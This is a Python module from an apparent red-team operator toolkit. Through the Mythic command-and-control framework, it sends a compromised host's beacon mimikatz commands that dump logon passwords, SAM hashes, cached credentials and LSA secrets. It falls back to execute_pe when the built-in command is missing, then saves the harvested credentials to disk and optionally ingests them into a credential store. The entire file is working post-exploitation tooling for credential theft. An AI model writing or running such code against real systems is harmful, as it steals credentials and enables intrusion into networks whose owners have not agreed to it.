from __future__ import annotations

import subprocess
from pathlib import Path

from mythic_operator.api import (
    beacon_to_row,
    create_task,
    extract_task_id,
    find_beacon,
    poll_task_output,
)

DEFAULT_COMMANDS = [
    "sekurlsa::logonpasswords",
    "lsadump::sam",
    "lsadump::cache",
    "lsadump::lsa /patch",
]


def parse_commands(value: str | None) -> list[str]:
    if not value:
        return DEFAULT_COMMANDS
    return [item.strip() for item in value.split(",") if item.strip()]


def _command_string(commands: list[str]) -> str:
    return " ".join(commands)


async def run_mimikatz(
    session,
    beacon_selector: str,
    commands_value: str | None,
    ingest: bool,
    tag: str | None,
    save: str | None,
    dry_run: bool,
) -> None:
    commands = parse_commands(commands_value)
    mimikatz_args = _command_string(commands)
    execute_pe_args = f'-PE mimikatz -Arguments "{mimikatz_args}"'

    if dry_run:
        print(f"[*] Beacon: {beacon_selector}")
        print(f"[*] Primary task: mimikatz {mimikatz_args}")
        print(f"[*] Fallback task: execute_pe {execute_pe_args}")
        return

    beacon = await find_beacon(session, beacon_selector)
    beacon_row = beacon_to_row(beacon)
    beacon_id = beacon_row["id"]

    task_response = None
    try:
        task_response = await create_task(
            session,
            beacon_id=beacon_id,
            callback_display_id=beacon_row["name"],
            command_name="mimikatz",
            params=mimikatz_args,
        )
        print("[+] Submitted built-in mimikatz task")
    except RuntimeError:
        task_response = await create_task(
            session,
            beacon_id=beacon_id,
            callback_display_id=beacon_row["name"],
            command_name="execute_pe",
            params=execute_pe_args,
        )
        print("[+] Built-in mimikatz unavailable; submitted execute_pe fallback")

    task_id = str(
        getattr(task_response, "id", None)
        or getattr(task_response, "task_id", None)
        or (task_response.get("id") if isinstance(task_response, dict) else None)
        or (task_response.get("task_id") if isinstance(task_response, dict) else None)
        or ""
    )
    if not task_id:
        task_id = extract_task_id(task_response)

    print(f"[*] Waiting for task output (task_id={task_id})")
    output = await poll_task_output(session, task_id=task_id, timeout=180, poll_interval=2)
    print(output)

    save_path = Path(save) if save else Path("99_CREDS") / f'{beacon_row["host"] or "beacon"}.mimidump'
    save_path.parent.mkdir(parents=True, exist_ok=True)
    save_path.write_text(output, encoding="utf-8")
    print(f"[+] Saved output to {save_path}")

    if ingest:
        ingest_tag = tag or (beacon_row["host"] or beacon_selector)
        subprocess.run(
            ["credops", "creds", "ingest", "--tag", ingest_tag],
            input=output,
            text=True,
            check=True,
        )
        print(f"[+] Ingested output with credops tag '{ingest_tag}'")
